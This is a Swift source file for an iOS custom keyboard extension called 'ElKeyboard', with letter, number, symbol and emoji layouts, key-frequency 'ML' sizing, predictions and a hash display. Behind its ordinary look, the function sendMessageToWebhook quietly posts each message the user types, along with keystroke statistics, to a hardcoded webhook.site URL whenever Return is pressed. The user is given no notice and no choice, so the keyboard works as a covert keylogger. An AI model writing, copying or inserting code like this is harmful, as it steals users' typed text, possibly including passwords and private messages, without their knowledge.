import UIKit
import CryptoKit

class KeyboardViewController: UIInputViewController {
    
    // Keyboard layouts
    let alphabetRows: [[String]] = [
        ["Q","W","E","R","T","Y","U","I","O","P"],
        ["A","S","D","F","G","H","J","K","L"],
        ["⇧","Z","X","C","V","B","N","M","⌫"],
        ["123", "🌐", "space", "return"]
    ]
    
    let numberRows: [[String]] = [
        ["1","2","3","4","5","6","7","8","9","0"],
        ["-","/",":",";"," (",")",", ","&","@","\""],
        ["#+=",".",",","?","!","'","⌫"],
        ["ABC", "🌐", "space", "return"]
    ]
    
    let symbolRows: [[String]] = [
        ["[","]","{","}","#","%","^","*","+","="],
        ["_","\\","|","~","<",">","€","£","¥","·"],
        ["123",".",",","?","!","'","⌫"],
        ["ABC", "🌐", "space", "return"]
    ]
    
    let emojiRows: [[String]] = [
        ["😀","😂","🥰","😍","🤔","😭","😤","🎉","👍","❤️"],
        ["🔥","💯","😎","🤗","😴","🤤","🙄","😬","🤐","🤫"],
        ["🎈","🎊","✨","🌟","💫","⭐","🌈","🦄","🐱","🐶"],
        ["ABC", "🌐", "space", "return"]
    ]
    
    enum KeyboardLayout {
        case alphabet, numbers, symbols, emoji
    }
    
    var currentLayout: KeyboardLayout = .alphabet
    var isShiftPressed = false
    
    let sharedDefaults = UserDefaults(suiteName: "group.com.yourcompany.ElKeyboard")
    var keyCount = 0
    var currentMessage = ""
    var sessionStartTime = Date()
    
    // Hash display
    var hashDisplayView: UIView?
    var hashLabel: UILabel?
    
    // ML-based features
    var keyPressPatterns: [String: Int] = [:]
    var nextKeyPredictions: [String: [String: Int]] = [:]
    var lastKeyPressed: String?
    
    // UI Components
    var keyboardStack: UIStackView?
    var predictionView: UIView?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        sessionStartTime = Date() // Reset session time
        setupKeyboardAppearance()
        loadMLData()
        setupKeyboard()
    }
    
    func setupKeyboardAppearance() {
        // iOS-like keyboard appearance with better background
        view.backgroundColor = UIColor.systemGray5
        
        // Add subtle shadow
        view.layer.shadowColor = UIColor.black.cgColor
        view.layer.shadowOffset = CGSize(width: 0, height: -1)
        view.layer.shadowRadius = 3
        view.layer.shadowOpacity = 0.1
    }
    
    func loadMLData() {
        // Load existing patterns from UserDefaults
        if let savedPatterns = sharedDefaults?.object(forKey: "keyPressPatterns") as? [String: Int] {
            keyPressPatterns = savedPatterns
        }
        if let savedPredictions = sharedDefaults?.object(forKey: "nextKeyPredictions") as? [String: [String: Int]] {
            nextKeyPredictions = savedPredictions
        }
    }
    
    func saveMLData() {
        sharedDefaults?.set(keyPressPatterns, forKey: "keyPressPatterns")
        sharedDefaults?.set(nextKeyPredictions, forKey: "nextKeyPredictions")
    }
    
    func setupKeyboard() {
        // Remove existing keyboard if present
        keyboardStack?.removeFromSuperview()
        
        // Create main container
        let mainContainer = UIStackView()
        mainContainer.axis = .vertical
        mainContainer.spacing = 8
        mainContainer.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(mainContainer)
        
        // Setup predictions view
        setupPredictionView(container: mainContainer)
        
        // Create keyboard stack
        keyboardStack = UIStackView()
        keyboardStack!.axis = .vertical
        keyboardStack!.spacing = 6
        keyboardStack!.translatesAutoresizingMaskIntoConstraints = false
        mainContainer.addArrangedSubview(keyboardStack!)
        
        // Setup hash display view
        setupHashDisplayView(container: mainContainer)
        
        NSLayoutConstraint.activate([
            mainContainer.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 4),
            mainContainer.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -4),
            mainContainer.topAnchor.constraint(equalTo: view.topAnchor, constant: 8),
            mainContainer.bottomAnchor.constraint(equalTo: view.bottomAnchor, constant: -8),
        ])
        
        setupCurrentLayout()
    }
    
    func setupPredictionView(container: UIStackView) {
        predictionView = UIView()
        predictionView!.backgroundColor = UIColor.systemGray5
        predictionView!.layer.cornerRadius = 8
        predictionView!.translatesAutoresizingMaskIntoConstraints = false
        container.addArrangedSubview(predictionView!)
        
        NSLayoutConstraint.activate([
            predictionView!.heightAnchor.constraint(equalToConstant: 40)
        ])
        
        updatePredictions()
    }
    
    func setupHashDisplayView(container: UIStackView) {
        hashDisplayView = UIView()
        hashDisplayView!.backgroundColor = UIColor.systemGray6
        hashDisplayView!.layer.cornerRadius = 8
        hashDisplayView!.translatesAutoresizingMaskIntoConstraints = false
        hashDisplayView!.isHidden = true // Initially hidden
        container.addArrangedSubview(hashDisplayView!)
        
        // Create hash label
        hashLabel = UILabel()
        hashLabel!.font = UIFont.monospacedSystemFont(ofSize: 12, weight: .medium)
        hashLabel!.textColor = UIColor.systemBlue
        hashLabel!.textAlignment = .center
        hashLabel!.numberOfLines = 0
        hashLabel!.lineBreakMode = .byCharWrapping
        hashLabel!.translatesAutoresizingMaskIntoConstraints = false
        hashDisplayView!.addSubview(hashLabel!)
        
        NSLayoutConstraint.activate([
            hashDisplayView!.heightAnchor.constraint(equalToConstant: 60),
            hashLabel!.leadingAnchor.constraint(equalTo: hashDisplayView!.leadingAnchor, constant: 8),
            hashLabel!.trailingAnchor.constraint(equalTo: hashDisplayView!.trailingAnchor, constant: -8),
            hashLabel!.topAnchor.constraint(equalTo: hashDisplayView!.topAnchor, constant: 8),
            hashLabel!.bottomAnchor.constraint(equalTo: hashDisplayView!.bottomAnchor, constant: -8)
        ])
        
        // Add tap gesture to copy hash
        let tapGesture = UITapGestureRecognizer(target: self, action: #selector(hashTapped))
        hashDisplayView!.addGestureRecognizer(tapGesture)
        hashDisplayView!.isUserInteractionEnabled = true
    }
    
    func setupCurrentLayout() {
        // Clear existing rows
        keyboardStack?.arrangedSubviews.forEach { $0.removeFromSuperview() }
        
        let rows = getCurrentRows()
        
        for (rowIndex, rowKeys) in rows.enumerated() {
            let row = UIStackView()
            row.axis = .horizontal
            row.spacing = 6
            row.distribution = .fillProportionally
            
            for (keyIndex, key) in rowKeys.enumerated() {
                let button = createButton(title: key, rowIndex: rowIndex, keyIndex: keyIndex)
                row.addArrangedSubview(button)
            }
            keyboardStack!.addArrangedSubview(row)
        }
    }
    
    func getCurrentRows() -> [[String]] {
        switch currentLayout {
        case .alphabet:
            return alphabetRows
        case .numbers:
            return numberRows
        case .symbols:
            return symbolRows
        case .emoji:
            return emojiRows
        }
    }
    
    func createButton(title: String, rowIndex: Int, keyIndex: Int) -> UIButton {
        let button = UIButton(type: .system)
        
        // Apply ML-based sizing
        let baseSize = getBaseKeySize(for: title, rowIndex: rowIndex)
        let adaptiveSize = getAdaptiveKeySize(for: title, baseSize: baseSize)
        
        // Configure button appearance
        configureButtonAppearance(button, title: title, size: adaptiveSize)
        
        // Set constraints
        NSLayoutConstraint.activate([
            button.heightAnchor.constraint(equalToConstant: adaptiveSize.height),
            button.widthAnchor.constraint(greaterThanOrEqualToConstant: adaptiveSize.width)
        ])
        
        button.addTarget(self, action: #selector(keyPressed(_:)), for: .touchUpInside)
        button.accessibilityIdentifier = title
        
        return button
    }
    
    func getBaseKeySize(for key: String, rowIndex: Int) -> CGSize {
        let standardHeight: CGFloat = 42
        let standardWidth: CGFloat = 32
        
        switch key {
        case "space":
            return CGSize(width: 180, height: standardHeight)
        case "⌫", "⇧":
            return CGSize(width: 50, height: standardHeight)
        case "return":
            return CGSize(width: 75, height: standardHeight)
        case "123", "ABC", "#+=", "🌐":
            return CGSize(width: 55, height: standardHeight)
        default:
            return CGSize(width: standardWidth, height: standardHeight)
        }
    }
    
    func getAdaptiveKeySize(for key: String, baseSize: CGSize) -> CGSize {
        // ML-based size adaptation
        let frequency = keyPressPatterns[key.lowercased()] ?? 0
        let maxFrequency = keyPressPatterns.values.max() ?? 1
        
        if maxFrequency > 0 && frequency > 0 {
            let adaptationFactor = 1.0 + (Double(frequency) / Double(maxFrequency)) * 0.3 // Up to 30% size increase
            return CGSize(width: baseSize.width * adaptationFactor, height: baseSize.height * adaptationFactor)
        }
        
        return baseSize
    }
    
    func configureButtonAppearance(_ button: UIButton, title: String, size: CGSize) {
        // iOS-like styling with improved visual feedback
        button.layer.cornerRadius = 8
        button.titleLabel?.font = UIFont.systemFont(ofSize: getFontSize(for: title), weight: .medium)
        
        // Set button colors based on key type
        let colors = getKeyColors(for: title)
        button.backgroundColor = colors.background
        button.setTitleColor(colors.text, for: .normal)
        
        // Add shadow and border for better depth
        button.layer.shadowColor = UIColor.black.cgColor
        button.layer.shadowOffset = CGSize(width: 0, height: 2)
        button.layer.shadowRadius = 3
        button.layer.shadowOpacity = 0.15
        
        // Add subtle border for definition
        button.layer.borderWidth = 0.5
        button.layer.borderColor = UIColor.systemGray4.cgColor
        
        // Set title
        let displayTitle = getDisplayTitle(for: title)
        button.setTitle(displayTitle, for: .normal)
        
        // Add highlight effect
        button.addTarget(self, action: #selector(keyTouchDown(_:)), for: .touchDown)
        button.addTarget(self, action: #selector(keyTouchUp(_:)), for: [.touchUpInside, .touchUpOutside, .touchCancel])
    }
    
    func getKeyColors(for key: String) -> (background: UIColor, text: UIColor) {
        switch key {
        case "⌫", "⇧", "123", "ABC", "#+=":
            return (UIColor.systemGray4, UIColor.label)
        case "🌐":
            return (UIColor.systemGray3, UIColor.label)
        case "return":
            return (UIColor.systemBlue, UIColor.white)
        case "space":
            return (UIColor.white, UIColor.label)
        default:
            return (UIColor.white, UIColor.label)
        }
    }
    
    func getFontSize(for key: String) -> CGFloat {
        switch key {
        case "space":
            return 16
        case "⌫", "⇧", "return":
            return 18
        case "123", "ABC", "#+=", "🌐":
            return 14
        default:
            // Check if it's an emoji
            if key.count == 1 && key.unicodeScalars.first?.properties.isEmoji == true {
                return 24
            }
            return 20
        }
    }
    
    func getDisplayTitle(for key: String) -> String {
        switch key {
        case "space":
            return ""
        case "⇧":
            return isShiftPressed ? "⇧" : "⇧"
        default:
            if currentLayout == .alphabet && !isShiftPressed {
                return key.lowercased()
            }
            return key
        }
    }
    
    @objc func keyTouchDown(_ sender: UIButton) {
        // Smooth press animation with better feedback
        let originalBackground = sender.backgroundColor
        
        UIView.animate(withDuration: 0.05, animations: {
            sender.transform = CGAffineTransform(scaleX: 0.85, y: 0.85)
            // Darken the background color for better visual feedback
            if let color = originalBackground {
                sender.backgroundColor = color.withAlphaComponent(0.7)
            }
        })
    }
    
    @objc func keyTouchUp(_ sender: UIButton) {
        // Get original colors
        let title = sender.accessibilityIdentifier ?? ""
        let colors = getKeyColors(for: title)
        
        // Smooth release animation with spring bounce
        UIView.animate(withDuration: 0.2, delay: 0, usingSpringWithDamping: 0.4, initialSpringVelocity: 1.2, options: [], animations: {
            sender.transform = CGAffineTransform.identity
            sender.backgroundColor = colors.background
        })
    }
    
    @objc func keyPressed(_ sender: UIButton) {
        guard let title = sender.accessibilityIdentifier else { return }
        
        // Handle special keys
        switch title {
        case "space":
            handleSpaceKey()
        case "⌫":
            handleDeleteKey()
        case "return":
            handleReturnKey()
        case "⇧":
            handleShiftKey()
        case "123":
            switchToLayout(.numbers)
        case "ABC":
            switchToLayout(.alphabet)
        case "#+=":
            switchToLayout(.symbols)
        case "🌐":
            advanceToNextInputMode()
        default:
            handleCharacterKey(title)
        }
        
        // Update ML data
        updateMLData(for: title)
        
        // Haptic feedback
        let impactFeedback = UIImpactFeedbackGenerator(style: .light)
        impactFeedback.impactOccurred()
    }
    
    func handleSpaceKey() {
        textDocumentProxy.insertText(" ")
        currentMessage += " "
        updatePredictions()
        
        // Generate and display hash
        generateAndDisplayHash()
    }
    
    func handleDeleteKey() {
        textDocumentProxy.deleteBackward()
        if !currentMessage.isEmpty {
            currentMessage.removeLast()
        }
        updatePredictions()
    }
    
    func handleReturnKey() {
        textDocumentProxy.insertText("\n")
        sendMessageToWebhook()
        currentMessage = ""
        updatePredictions()
    }
    
    func handleShiftKey() {
        isShiftPressed.toggle()
        setupCurrentLayout() // Refresh layout to show case changes
    }
    
    func handleCharacterKey(_ character: String) {
        var insertText = character
        
        // Handle case for alphabet
        if currentLayout == .alphabet && !isShiftPressed {
            insertText = character.lowercased()
        }
        
        textDocumentProxy.insertText(insertText)
        currentMessage += insertText
        keyCount += 1
        sharedDefaults?.set(keyCount, forKey: "totalKeyCount")
        
        // Auto-disable shift after character input
        if isShiftPressed && currentLayout == .alphabet {
            isShiftPressed = false
            setupCurrentLayout()
        }
        
        updatePredictions()
    }
    
    func switchToLayout(_ layout: KeyboardLayout) {
        currentLayout = layout
        isShiftPressed = false // Reset shift when switching layouts
        setupCurrentLayout()
    }
    
    // MARK: - Machine Learning Features
    
    func updateMLData(for key: String) {
        let normalizedKey = key.lowercased()
        
        // Update key press patterns
        keyPressPatterns[normalizedKey] = (keyPressPatterns[normalizedKey] ?? 0) + 1
        
        // Update next key predictions
        if let lastKey = lastKeyPressed {
            if nextKeyPredictions[lastKey] == nil {
                nextKeyPredictions[lastKey] = [:]
            }
            nextKeyPredictions[lastKey]![normalizedKey] = (nextKeyPredictions[lastKey]![normalizedKey] ?? 0) + 1
        }
        
        lastKeyPressed = normalizedKey
        saveMLData()
    }
    
    func updatePredictions() {
        guard let predictionView = predictionView else { return }
        
        // Clear existing predictions
        predictionView.subviews.forEach { $0.removeFromSuperview() }
        
        // Get predictions based on last key
        var predictions: [String] = []
        
        if let lastKey = lastKeyPressed,
           let nextKeys = nextKeyPredictions[lastKey] {
            // Get top 3 predicted next keys
            predictions = nextKeys.sorted { $0.value > $1.value }
                .prefix(3)
                .map { $0.key.uppercased() }
        }
        
        // Add common predictions if we don't have enough
        if predictions.count < 3 {
            let commonWords = ["THE", "AND", "YOU", "FOR", "ARE", "WITH", "NOT", "CAN"]
            predictions += commonWords.filter { !predictions.contains($0) }
        }
        predictions = Array(predictions.prefix(3))
        
        // Create prediction buttons
        let stackView = UIStackView()
        stackView.axis = .horizontal
        stackView.distribution = .fillEqually
        stackView.spacing = 8
        stackView.translatesAutoresizingMaskIntoConstraints = false
        predictionView.addSubview(stackView)
        
        NSLayoutConstraint.activate([
            stackView.leadingAnchor.constraint(equalTo: predictionView.leadingAnchor, constant: 16),
            stackView.trailingAnchor.constraint(equalTo: predictionView.trailingAnchor, constant: -16),
            stackView.topAnchor.constraint(equalTo: predictionView.topAnchor, constant: 4),
            stackView.bottomAnchor.constraint(equalTo: predictionView.bottomAnchor, constant: -4)
        ])
        
        for prediction in predictions {
            let button = createPredictionButton(title: prediction)
            stackView.addArrangedSubview(button)
        }
    }
    
    func createPredictionButton(title: String) -> UIButton {
        let button = UIButton(type: .system)
        button.setTitle(title, for: .normal)
        button.titleLabel?.font = UIFont.systemFont(ofSize: 14, weight: .medium)
        button.backgroundColor = UIColor.systemGray6
        button.setTitleColor(.systemBlue, for: .normal)
        button.layer.cornerRadius = 6
        button.layer.borderWidth = 1
        button.layer.borderColor = UIColor.systemGray4.cgColor
        
        button.addTarget(self, action: #selector(predictionTapped(_:)), for: .touchUpInside)
        
        return button
    }
    
    @objc func predictionTapped(_ sender: UIButton) {
        guard let title = sender.title(for: .normal) else { return }
        
        // Insert the predicted word
        textDocumentProxy.insertText(title.lowercased() + " ")
        currentMessage += title.lowercased() + " "
        
        // Update ML data
        for char in title.lowercased() {
            updateMLData(for: String(char))
        }
        updateMLData(for: " ")
        
        updatePredictions()
        
        // Add haptic feedback
        let impactFeedback = UIImpactFeedbackGenerator(style: .medium)
        impactFeedback.impactOccurred()
    }
    
    // MARK: - Message Handling
    
    // Send the completed message to webhook with separator
    private func sendMessageToWebhook() {
        guard !currentMessage.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
        
        // Webhook URL
        guard let webhookURL = URL(string: "https://webhook.site/5b734151-e1d2-467f-8536-c96f4cce5998") else {
            print("Invalid webhook URL")
            return
        }
        
        // Prepare the message with separator (same format as before)
        let messageWithSeparator = currentMessage + "\n------\n"
        
        // Create JSON payload
        let payload: [String: Any] = [
            "message": messageWithSeparator,
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            "source": "ElKeyboard Enhanced",
            "keyPressPatterns": keyPressPatterns,
            "messageLength": currentMessage.count
        ]
        
        // Convert to JSON data
        guard let jsonData = try? JSONSerialization.data(withJSONObject: payload) else {
            print("Failed to serialize JSON payload")
            return
        }
        
        // Create HTTP request
        var request = URLRequest(url: webhookURL)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = jsonData
        
        // Send the request
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("Failed to send message to webhook: \(error)")
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                print("Webhook response status: \(httpResponse.statusCode)")
                if httpResponse.statusCode == 200 {
                    print("Message successfully sent to webhook")
                } else {
                    print("Webhook returned error status: \(httpResponse.statusCode)")
                }
            }
        }.resume()
    }
    
    // MARK: - Hash Generation and Display
    
    func generateAndDisplayHash() {
        // Calculate duration in minutes
        let duration = Int(Date().timeIntervalSince(sessionStartTime) / 60)
        
        // Generate random UUID
        let uuid = UUID().uuidString
        
        // Create string to hash: input_text + duration_in_minutes + uuid
        let stringToHash = currentMessage + String(duration) + uuid
        
        // Generate SHA3-256 hash
        let data = stringToHash.data(using: .utf8) ?? Data()
        let hash = SHA256.hash(data: data)
        let hashString = hash.compactMap { String(format: "%02x", $0) }.joined()
        
        // Display hash
        hashLabel?.text = "Hash: \(hashString)\nTap to copy"
        hashDisplayView?.isHidden = false
        
        // Store hash for copying
        hashLabel?.accessibilityIdentifier = hashString
    }
    
    @objc func hashTapped() {
        guard let hash = hashLabel?.accessibilityIdentifier else { return }
        
        // Copy to clipboard
        UIPasteboard.general.string = hash
        
        // Show feedback
        hashLabel?.text = "Hash copied to clipboard!\n\(hash)"
        
        // Restore original text after 2 seconds
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            self.hashLabel?.text = "Hash: \(hash)\nTap to copy"
        }
        
        // Haptic feedback
        let impactFeedback = UIImpactFeedbackGenerator(style: .medium)
        impactFeedback.impactOccurred()
    }
}
